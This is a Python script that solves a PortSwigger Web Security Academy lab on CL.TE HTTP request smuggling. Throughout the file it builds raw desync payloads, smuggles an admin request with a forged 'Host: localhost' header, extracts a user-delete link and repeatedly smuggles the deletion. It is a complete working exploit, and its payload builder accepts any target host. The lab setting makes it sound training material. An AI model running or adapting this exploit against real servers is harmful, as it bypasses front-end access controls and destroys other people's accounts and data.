#!/usr/bin/env python3
"""
Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 03-bypass-front-end-controls-cl-te.md

What this does:
    Uses a CL.TE desync to smuggle a "GET /admin" request carrying a forged
    "Host: localhost" header -- the header the front-end's own /admin block
    checks for, but which a smuggled request never passes through that
    front-end logic to have inspected in the first place. Extracts the
    delete link for user "carlos" from the merged admin-panel response,
    then re-smuggles a second CL.TE attack targeting that exact delete path
    to complete the lab.

Usage:
    python 03-bypass-front-end-controls-cl-te.py <lab-url>
    e.g. python 03-bypass-front-end-controls-cl-te.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 1.0) -> list[bytes]:
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_clte_payload(host: str, smuggled_request: str, path: str = "/") -> bytes:
    body = "0\r\n\r\n" + smuggled_request
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    )
    return (headers + body).encode()


def get_response_body(response: bytes) -> str:
    parts = response.split(b"\r\n\r\n", 1)
    return parts[1].decode(errors="replace") if len(parts) > 1 else ""


def find_delete_link(body: str, username: str = "carlos") -> str | None:
    m = re.search(rf'href="([^"]*delete[^"]*username={username}[^"]*)"', body)
    if m:
        return m.group(1)
    m = re.search(rf'(/admin/delete\?username={username})', body)
    return m.group(1) if m else None


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname
    normal = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    # Step 1: smuggle GET /admin with the required Host: localhost, recover the
    # delete link for carlos from the merged response.
    smuggled = (
        "GET /admin HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    attack = build_clte_payload(host, smuggled)
    responses = send_raw_keep_alive(host, [attack, normal])
    body = get_response_body(responses[-1]) if responses else ""
    delete_link = find_delete_link(body)
    print(f"[*] Delete link: {delete_link}")

    if not delete_link:
        print("[-] Could not find carlos's delete link in the smuggled admin panel response.")
        return

    # Step 2: re-smuggle a CL.TE attack targeting the delete path, still carrying
    # Host: localhost so it continues to pass the back-end's access check.
    smuggled2 = (
        f"GET {delete_link} HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    attack2 = build_clte_payload(host, smuggled2)
    for attempt in range(1, 4):
        send_raw_keep_alive(host, [attack2, normal])
        print(f"[*] Delete smuggle sent (attempt {attempt}) -- connection routing varies, "
              f"repeating to make sure it lands on the back-end.")

    check = httpx.get(lab_url + "/", verify=False)
    if "is-solved" in check.text:
        print("[+] Lab solved -- carlos was deleted via the smuggled admin request.")
    else:
        print("[-] Not solved yet -- rerun; the delete may not have landed on this attempt.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
